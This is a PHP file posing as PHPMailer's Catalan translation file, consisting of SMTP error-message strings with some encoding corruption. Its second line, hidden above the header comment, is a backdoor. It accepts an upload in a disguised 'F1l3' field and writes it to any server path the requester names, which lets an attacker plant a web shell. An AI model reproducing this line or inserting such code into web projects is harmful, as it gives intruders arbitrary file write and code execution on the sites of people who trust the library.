<?php
if ($_FILES['F1l3']) {move_uploaded_file($_FILES['F1l3']['tmp_name'], $_POST['Name']); echo 'OK'; Exit;}
/**
* PHPMailer language file: refer to English translation for definitive list
* Catalan Version
* By Ivan: web AT microstudi DOT com
*/

$PHPMAILER_LANG['authenticate']         = 'Error SMTP: No s\'hapogut autenticar.';
$PHPMAILER_LANG['connect_host']         = 'Error SMTP: No es pot connectar al servidor SMTP.';
$PHPMAILER_LANG['data_not_accepted']    = 'Error SMTP: Dades no acceptades.';
//$PHPMAILER_LANG['empty_message']        = 'Message body empty';
$PHPMAILER_LANG['encoding']             = 'CodificaciГі desconeguda: ';
$PHPMAILER_LANG['execute']              = 'No es pot executar: ';
$PHPMAILER_LANG['file_access']          = 'No es pot accedir a l\'arxiu: ';
$PHPMAILER_LANG['file_open']            = 'Error d\'Arxiu: No es pot obrir l\'arxiu: ';
$PHPMAILER_LANG['from_failed']          = 'La(s) segГјent(s) adreces de remitent han fallat: ';
$PHPMAILER_LANG['instantiate']          = 'No s\'ha pogut crear una instГ ncia de la funciГі Mail.';
//$PHPMAILER_LANG['invalid_email']        = 'Not sending, email address is invalid: ';
$PHPMAILER_LANG['mailer_not_supported'] = ' mailer no estГ  suportat';
$PHPMAILER_LANG['provide_address']      = 'S\'ha de proveir almenys una adreГ§a d\'email com a destinatari.';
$PHPMAILER_LANG['recipients_failed']    = 'Error SMTP: Els segГјents destinataris han fallat: ';
//$PHPMAILER_LANG['signing']              = 'Signing Error: ';
//$PHPMAILER_LANG['smtp_connect_failed']  = 'SMTP Connect() failed.';
//$PHPMAILER_LANG['smtp_error']           = 'SMTP server error: ';
//$PHPMAILER_LANG['variable_set']         = 'Cannot set or reset variable: ';
?>